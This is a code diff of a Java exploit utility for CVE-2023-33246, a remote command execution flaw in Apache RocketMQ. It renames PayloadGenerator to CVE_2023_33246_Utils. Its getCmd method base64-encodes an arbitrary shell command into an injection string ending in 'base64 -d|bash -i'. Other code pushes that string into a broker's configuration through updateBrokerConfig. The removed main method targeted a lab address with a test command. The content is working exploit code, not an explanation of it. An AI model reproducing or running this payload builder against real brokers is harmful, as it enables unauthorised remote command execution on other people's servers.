@@ -11,9 +11,12 @@ import java.io.UnsupportedEncodingException;
 import java.util.Base64;
 import java.util.Properties;
 
-public class PayloadGenerator {
+public class CVE_2023_33246_Utils {
 
-    public String getCmd(String cmd){
+    static String rocketmqHome;
+    static String filterServerNums;
+
+    public static String getCmd(String cmd){
         String cmdBase = Base64.getEncoder().encodeToString(cmd.getBytes());
         return "-c $@|sh . echo echo \"" + cmdBase + "\"|base64 -d|bash -i;";
     }
@@ -29,15 +32,9 @@ public class PayloadGenerator {
 
         adminExt.updateBrokerConfig(url, properties);
         Properties brokerConfig = adminExt.getBrokerConfig(url);
-        System.out.println(brokerConfig.getProperty("rocketmqHome"));
-        System.out.println(brokerConfig.getProperty("filterServerNums"));
+        rocketmqHome = brokerConfig.getProperty("rocketmqHome");
+        filterServerNums =brokerConfig.getProperty("filterServerNums");
 
         adminExt.shutdown();
-    }
-
-    public static void main(String[] args) throws RemotingConnectException, RemotingSendRequestException, RemotingTimeoutException, MQBrokerException, UnsupportedEncodingException, InterruptedException, MQClientException {
-        String url = "192.168.178.128:10911";
-        PayloadGenerator payloadGenerator = new PayloadGenerator();
-        updateConfig(url, payloadGenerator.getCmd("touch /tmp/1111"));
     }
 }
